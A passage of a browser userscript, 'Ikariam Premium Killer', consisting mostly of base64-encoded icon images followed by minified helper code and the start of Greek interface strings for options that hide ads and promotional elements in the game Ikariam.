    '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';

var questionmark_icon_png = 'data:image/png;base64,'+
    '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';

var btn_shippirate_jpg = 'data:image/jpeg;base64,'+
    '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';

// Images end

String.prototype.trim=function(e,t){return ltrim(rtrim(e,t),t)};String.prototype.ltrim=function(e,t){t=t||"\\s";return e.replace(new RegExp("^["+t+"]+","g"),"")};String.prototype.rtrim=function(e,t){t=t||"\\s";return e.replace(new RegExp("["+t+"]+$","g"),"")};String.prototype.startsWith=function(e){return this.match("^"+e)==e};String.prototype.endsWith=function(e){return this.match(e+"$")==e};String.prototype.format=function(){var e=this,t=arguments;if(t&&typeof t[0]=="object")t=t[0];for(arg in t){e=e.replace(new RegExp("\\{"+arg+"\\}","gi"),t[arg])}return e};String.prototype.stripLinks=function(){return this.replace(/<a[^>]*?>.*?<\/a>/gi,"")};$.extend({getUrlVars:function(e){var t=[],n,r=e||window.location.href;var i=r.slice(r.indexOf("?")+1).split("&");for(var s=0;s<i.length;s++){n=i[s].split("=");t.push(n[0]);t[n[0]]=n[1]}return t},getUrlVar:function(e,t,n){t=t||"";var r=n||$.getUrlVars();if(e in r)return r[e];else return t},urlVarExists:function(e,t){var n=t||$.getUrlVars();return e in n}});$.fn.extend({exists:function(){return this.length>0}});var IPK={ID:104882,Name:"Ikariam Premium Killer",Version:"2.2.4b",Hostname:window.location.hostname};try{ScriptUpdater.check(IPK.ID,IPK.Version)}catch(e){}IPK.Templates={settingsTitle:function(e){return"{0} v{1} - {2}".format(IPK.Name,IPK.Version,e)},globalPreference:function(e){return'{0} <span style="font-style:italic">({1})</span>'.format(e,IPK.Language.get("forAllServers"))},cssBackground:function(e,t){return"url({0}) {1}".format(e,t||"")},script:function(e,t){return'<{0} type="{1}">\n{2}\n</{0}>'.format("script",e,t)}};IPK.Utils={doSafeReload:function(e){if(IPK.NoAction||e===true)window.location=window.location.href.split("#")[0]}};IPK.Language={gr:{premium:"Ikariam PLUS",changeFemaleAdvisor:"Αλλαγή του θηλυκού δημάρχου",promoToolbar:"Απόκρυψη της μπάρας promotion της gameforge",happyHour:"Happy hour ειδική προσφορά",changeAmbrosiaFancyIcon:"Απλοποίηση  του φανταχτερού εικονιδίου αμβροσίας",hideAmbrosiaFancyIcon:"Απόκρυψη του φανταχτερού εικονιδίου αμβροσίας",facebookIcon:"Σύνδεσμος δημοσίευσης στο Facebook",viewPremiumAdvisors:"Προβολή premium/χρυσών εικονιδίων στους συμβούλους",hideAdsBanners:"Πλαίσια διαφημίσεων",tbPlus:"Κουμπί plus της γραμμής εργαλείων στην 